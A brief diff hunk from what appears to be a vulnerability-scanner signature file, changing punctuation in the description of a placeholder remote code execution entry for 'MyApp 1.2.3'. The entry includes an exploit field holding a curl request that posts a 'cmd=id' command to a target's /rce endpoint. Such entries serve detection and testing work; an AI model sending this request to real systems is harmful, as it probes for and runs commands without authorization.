@@ -214,7 +214,7 @@ pattern = "myapp/1.2.3"
 cve = "CVE-2024-12345"
 cvss = 9.8
 severity = "critical"
-description = "MyApp 1.2.3 — Remote Code Execution vulnerability."
+description = "MyApp 1.2.3: Remote Code Execution vulnerability."
 exploit = "curl http://TARGET:8080/rce -d 'cmd=id'"
 ```
 
